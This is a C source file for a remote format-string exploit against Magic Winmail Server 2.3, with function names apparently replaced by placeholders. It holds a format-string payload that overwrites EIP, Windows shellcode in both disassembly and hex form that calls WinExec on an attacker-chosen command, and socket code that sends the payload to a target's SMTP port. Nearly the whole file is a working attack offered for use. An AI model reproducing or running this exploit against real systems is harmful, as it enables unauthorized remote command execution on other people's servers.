#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  sin ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int /*<<< orphan*/  WORD ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct TYPE_4__ {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
typedef  int /*<<< orphan*/  SOCKET ;
typedef  TYPE_2__ SOCKADDR_IN ;
typedef  int /*<<< orphan*/  SOCKADDR ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  INADDR_NONE ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC3 (char*) ; 
 scalar_t__ FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC13 (char*) ; 

int FUNC14 (int argc, char *argv[])
{

	SOCKET sock;

	char buffer[1000];
	int i;

	// ecrasement d'un saved EIP grâce aux caractères de format
	char vuln[] = 		
		"\xec\xfc\x66\x01%x%x"
		"\xed\xfc\x66\x01%x%x"
		"\xee\xfc\x66\x01"
		
		"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%28x%n"
		"%97x%n%105x%hn"

/*

  This is my specific shellcode for execute a command
  over the Magic Winmail process.

  This one can contain null bytes, enjoy ! :)

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Disassembly of File: mailserver.exe
Code Offset = 00001000, Code Size = 000CF000
Data Offset = 000EC000, Data Size = 0002E000
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 Reference To: KERNEL32.GetModuleHandleA, Ord:0000h
:004B8850 FF15AC014D00            Call dword ptr [004D01AC]

 Reference To: KERNEL32.ExitProcess, Ord:0000h
:004B88C6 FF1598014D00            Call dword ptr [004D0198]

 Reference To: KERNEL32.GetProcAddress, Ord:0000h
:00406CE7 8B3DEC004D00            mov edi, dword ptr [004D00EC]
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

  //////////////////////// My shellcode \\\\\\\\\\\\\\\\\\\\\\\\\\

: EB50                    jmp 00401058
: 5E                      pop esi
: 8BEC                    mov ebp, esp
: 83EC28                  sub esp, 00000028		// je cree un stack
: C745D84B65726E          mov [ebp-28], 6E72654B
: C745DC656C3332          mov [ebp-24], 32336C65 // j'y place 'Kernel32'
: C745E000000000          mov [ebp-20], 00000000
: C745E457696E45          mov [ebp-1C], 456E6957
: C745E878656300          mov [ebp-18], 00636578 // ici 'WinExec'

// adaptez le shellcode en virant cette ligne si vraiment vous avez besoin 
// de 4 caractères de plus pour la commande à executer
: C645EB00                mov [ebp-15], 00
										
: BAAC014D00              mov edx, 004D01AC
: 8D45D8                  lea eax, dword ptr [ebp-28]
: 50                      push eax
: FF12                    call dword ptr [edx]	// eax = GetModuleHandle ("Kernel32");
: 8D5DE4                  lea ebx, dword ptr [ebp-1C]
: 53                      push ebx
: 50                      push eax
: BAEC004D00              mov edx, 004D00EC
: FF12                    call dword ptr [edx]	// GetProcAdress (eax, "WinExec");
: 6A01                    push 00000001		// 1 = SW_SHOW, 0 = SW_HIDE 
: 56                      push esi
: FFD0                    call eax			// WinExec (argv[2], SW_SHOW)
: BA98014D00              mov edx, 004D0198
: FF12                    call dword ptr [edx]	// ExitProcess ();
: E8ABFFFFFF              call 00401008	

  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ EOF /////////////////////////////////

  */
	

// Generated by Hex Workshop
// shellcode.exe - Starting Offset: 4102 (0x00001006) Length: 87 (0x00000057)

	"\x00\x90\x90\x90\x90"	// sa, c'est pour bien coller
	"\xEB\x50\x5E\x8B\xEC\x83\xEC\x28\xC7\x45\xD8\x4B\x65\x72\x6E\xC7" 
	"\x45\xDC\x65\x6C\x33\x32\xC7\x45\xE0\x00\x00\x00\x00\xC7\x45\xE4" 
	"\x57\x69\x6E\x45\xC7\x45\xE8\x78\x65\x63\x00\xC6\x45\xEB\x00\xBA" 
	"\xAC\x01\x4D\x00\x8D\x45\xD8\x50\xFF\x12\x8D\x5D\xE4\x53\x50\xBA" 
	"\xEC\x00\x4D\x00\xFF\x12\x6A\x01\x56\xFF\xD0\xBA\x98\x01\x4D\x00" 
	"\xFF\x12\xE8\xAB\xFF\xFF\xFF";

	SOCKADDR_IN sin;
	WSADATA wsadata;
	WORD wVersionRequested = FUNC1 (2,0);

	//
	FUNC8 ("* #################################### *\n"
		"  Magic Winmail Server 2.3(Build 0402)\n"
		"     Remote format string exploit !\n"
		"* #################################### *\n"
		"  Coded By ThreaT -> ThreaT\n\n");

	if (argc < 3 || FUNC13 (argv[2]) > 90)
	{
	FUNC8 ("usage : mwmxploit <Target IP> <command to execute> [smtp port]\n\n"
			" + The command to execute cannot exceed 90 characters +\n");
	FUNC0 (0);
	}

	if ( FUNC2(wVersionRequested, &wsadata) )
	{
		FUNC8 ("Erreur d'initialisation winsock !\n");
		FUNC0 (1);		
	}

	sin.sin_family = AF_INET;
	sin.sin_port = FUNC5 ((void *)argv[3] ? FUNC3 (argv[3]) : 25);
	
	if ( (sin.sin_addr.s_addr = FUNC6 (argv[1])) == INADDR_NONE)
	{
		FUNC8 ("Erreur : L'adresse IP de la victime est incorrect !\n");
		FUNC0 (2);
	}

	FUNC8 ("connecting to %s on port %u...", argv[1], FUNC7 ( sin.sin_port ) );

	sock = FUNC12 (AF_INET, SOCK_STREAM, 0);
	if ( FUNC4 (sock, (SOCKADDR *)&sin, sizeof (sin)) )
	{
		FUNC8 ("erreur : connexion impossible !\n");
		FUNC0 (3);
	}

	FUNC10 (sock,buffer,1000,0);
	
	FUNC8 ("ok\n-> %s\nsending exploit code...",buffer);

	FUNC11 (sock, vuln, FUNC13 (vuln) + 92, 0);  // envoi du shellcode
	FUNC11 (sock, argv[2], FUNC13 (argv[2]), 0); // envoi de la commande
	FUNC11 (sock, "\r\n", 2, 0); // validation

	FUNC10 (sock,buffer,1000,0); // remote crash :)

	FUNC9 ("ok");
}